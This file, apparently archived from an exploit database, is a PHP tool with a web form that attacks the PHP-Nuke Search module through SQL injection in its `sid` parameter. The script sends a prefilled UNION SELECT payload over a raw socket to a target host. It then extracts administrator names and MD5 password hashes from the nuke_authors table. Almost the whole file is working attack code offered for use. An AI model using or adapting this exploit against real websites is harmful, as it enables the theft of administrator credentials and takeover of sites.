@@ -1,0 +1,144 @@
+<?php
+##########################################################
+# UNPUBLISHED RST/GHC EXPLOIT
+# PHP Nuke `sid` sql injection exploit for Search module
+# POST method -
+# the best for version 8.0 FINAL
+# (c)oded by Foster & 1dt.w0lf
+##########################################################
+# tested on 6.0 , 6.6 , 7.9 , 8.0 FINAL versions
+##########################################################
+
+if (isset($_POST['Submit'])){
+$result=sendit('CONCAT("::",aid,"::",pwd,"::")');
+if (preg_match("/::([^:]*)::([a-f0-9]{32})::/",$result, $matches))
+{$ahash = $matches[2]; $aname = $matches[1];}
+
+}
+
+function sendit($param){
+$prefix = $_POST['prefix'];
+$data = $_POST['sql_text'];
+$host = $_POST['hostname'];
+$page = (isset($_POST['dir'])) ? '/'.$_POST['dir'] : '';
+$page .= '/modules.php?name=Search';
+$method = $_POST['method'];
+$ref_text = $_POST['ref_text'];
+$user_agent = $_POST['user_agent'];
+$result = '';
+$sock = fsockopen($host, 80, $errno, $errstr, 50);
+if (!$sock) die("$errstr ($errno)\n");
+fputs($sock, "$method /$page HTTP/1.0\r\n");
+fputs($sock, "Host: $host" . "\r\n");
+fputs($sock, "Content-type: application/x-www-form-urlencoded\r\n");
+fputs($sock, "Content-length: " . strlen($data) . "\r\n");
+fputs($sock, "Referer: $ref_text". "\r\n");
+fputs($sock, "User-Agent: $user_agent" . "\r\n");
+fputs($sock, "Accept: */*\r\n");
+fputs($sock, "\r\n");
+fputs($sock, "$data\r\n");
+fputs($sock, "\r\n");
+
+while (!feof($sock)) {
+$result .= fgets ($sock,8192);
+}
+fclose($sock);
+return $result;
+
+}
+
+
+?>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1251">
+<TITLE>RST/GHC PHP Nuk'em exploit</TITLE>
+<style>
+a:link{color: #000000; text-decoration: none;}
+a:visited{color: #000000; text-decoration: none;}
+a:hover,a:active{color:#e49a34; text-decoration:underline;}
+table{color:#000000;font-family:verdana;font-size:8pt;}
+.style2 {
+color: #FFFFFF;
+font-weight: bold;
+}
+.style3 {color: #E39930}
+.style5 {color: #000000; font-weight: bold; }
+</style>
+<body bgcolor="#525254">
+<form method=post>
+<p class="style2"><font size="3" face="Arial, Helvetica, sans-serif">PHP Nuke <span class="style3">QUERY MANIPULATOR</span> based on <font size="3" face="Arial, Helvetica, sans-serif">`sid` POST sql injection</font> exploit for Search module </font></p>
+<table width="900" border="0">
+<tr bgcolor="#FFFFFF">
+<td width="12%"><strong><font color="#000000" size="2" face="Arial, Helvetica, sans-serif">Parameter</font></strong></td>
+<td width="88%" bgcolor="#FFFFFF"><span class="style5"><font size="2" face="Arial, Helvetica, sans-serif">Value</font></span></td>
+</tr>
+<tr>
+<td bgcolor="E39930"><strong><font color="#000000" size="2" face="Arial, Helvetica, sans-serif">url
+</font></strong></td>
+<td bgcolor="#999999"><font face="Arial, Helvetica, sans-serif">
+<input name="hostname" type="text" id="hostname" value="<?=(isset($_POST['hostname'])) ? $_POST['hostname'] : 'nuke.cc'; ?>">
+</font></td>
+</tr>
+<tr>
+<td bgcolor="E39930"><strong><font color="#000000" size="2" face="Arial, Helvetica, sans-serif">dir</font>
+</strong></td>
+<td bgcolor="#999999"><font face="Arial, Helvetica, sans-serif">
+<input name="dir" type="text" id="dir" value="<?=(isset($_POST['dir'])) ? $_POST['dir'] : 'phpnuke'; ?>">
+</font></td>
+</tr>
+<tr>
+<td bgcolor="E39930"><strong><font color="#000000" size="2" face="Arial, Helvetica, sans-serif">referer</font></strong></td>
+<td bgcolor="#999999"><font face="Arial, Helvetica, sans-serif">
+<input type="text" name="ref_text" value="<?=(isset($_POST['ref_text'])) ? $_POST['ref_text'] : 'http://jihad.in.us'; ?>" size="60">
+</font></td>
+</tr>
+<tr>
+<td bgcolor="E39930">SQL query</td>
+<td bgcolor="#999999"><font face="Arial, Helvetica, sans-serif">
+<input type="text" name="sql_text" value="<?=(isset($_POST['sql_text'])) ? $_POST['sql_text'] : 'query=AAA&topic=&category=0&author=&days=0&type=comments&sid=999999\'/**/UNION%20SELECT%20`pwd`%20as%20title%20FROM%20nuke_authors%20WHERE%20radminsuper=\'1'; ?>" size="80">
+</font></td>
+</tr>
+<tr>
+<td bgcolor="E39930"><strong><font color="#000000" size="2" face="Arial, Helvetica, sans-serif">user
+agent</font></strong></td>
+<td bgcolor="#999999"><font face="Arial, Helvetica, sans-serif">
+<input type="text" name="user_agent" value="<?=(isset($_POST['user_agent'])) ? $_POST['user_agent'] : 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)'; ?>" size="60">
+</font></td>
+</tr>
+<tr>
+<td bgcolor="E39930"><strong><font size="2" face="Arial, Helvetica, sans-serif">table prefix </font></strong></td>
+<td bgcolor="#999999"><font face="Arial, Helvetica, sans-serif">
+<input name="prefix" type="text" id="prefix" value="<?=(isset($_POST['prefix'])) ? $_POST['prefix'] : 'nuke'; ?>">
+</font></td>
+</tr>
+<tr>
+<td bgcolor="E39930"><strong><font size="2" face="Arial, Helvetica, sans-serif">method</font></strong></td>
+<td bgcolor="#999999"><select name="method" size="1" id="method">
+<option value="POST">POST</option>
+<option value="GET">GET</option>
+</select></td>
+</tr>
+<tr>
+<td bgcolor="E39930">&nbsp;</td>
+<td bgcolor="#999999">&nbsp;</td>
+</tr>
+</table>
+<p>
+<input type="submit" name="Submit" value="rock-n-roll">
+</p>
+</form>
+
+
+
+
+<font size="2">(c) RST/GHC</font>
+
+<hr size="3">
+<?
+# DEBUG
+
+print $result;
+?>
+
+# milw0rm.com [2008-01-22]
